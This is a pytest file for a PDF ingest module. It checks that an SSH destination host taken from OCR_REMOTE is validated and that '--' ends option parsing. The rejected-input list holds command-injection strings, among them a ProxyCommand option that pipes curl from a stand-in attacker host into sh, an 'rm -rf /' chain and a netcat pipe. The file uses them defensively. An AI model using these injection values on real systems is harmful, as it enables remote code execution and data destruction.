"""OCR_REMOTE reaches ssh and scp as the destination argument.

`lang` was shlex-quoted; the host was not. ssh reads a leading "-" as an
option, so OCR_REMOTE="-oProxyCommand=..." is command execution on the ingest
box — which runs unattended timers.
"""
import pytest

from _common import pdf


class TestTheHostIsValidated:
    @pytest.mark.parametrize("host", [
        "ocr-host.example",
        "user@ocr-host.example",
        "scraper@192.0.2.10",
        "box",
    ])
    def test_an_ordinary_destination_is_accepted(self, host):
        assert pdf._valid_ocr_host(host)

    @pytest.mark.parametrize("host", [
        "-oProxyCommand=curl attacker.example|sh",
        "-obatchmode=no",
        "host; rm -rf /",
        "host$(whoami)",
        "host`id`",
        "host with spaces",
        "host|nc attacker 1234",
        "",
        None,
    ])
    def test_an_option_or_metacharacter_is_refused(self, host):
        assert not pdf._valid_ocr_host(host)


class TestARefusedHostNeverReachesSsh:
    def test_no_subprocess_is_spawned(self, monkeypatch, tmp_path):
        calls = []
        monkeypatch.setattr(pdf.subprocess, "run",
                            lambda *a, **k: calls.append(a) or None)
        f = tmp_path / "x.pdf"
        f.write_bytes(b"%PDF")

        assert pdf._ocr_remote(str(f), "eng", "-oProxyCommand=id") == ""
        assert calls == [], "a rejected host must not reach scp or ssh at all"

    def test_a_valid_host_still_runs(self, monkeypatch, tmp_path):
        # The guard must not break the feature it protects.
        class _R:
            returncode = 0
            stdout = b"OCR TEXT"
        calls = []

        def _run(argv, **kw):
            calls.append(argv)
            return _R()

        monkeypatch.setattr(pdf.subprocess, "run", _run)
        f = tmp_path / "x.pdf"
        f.write_bytes(b"%PDF")

        assert pdf._ocr_remote(str(f), "eng", "user@ocr.example") == "OCR TEXT"
        assert calls[0][0] == "scp"
        assert calls[1][0] == "ssh"
        # "--" ends option parsing on both, so nothing after it is a flag.
        assert "--" in calls[0]
        assert "--" in calls[1]
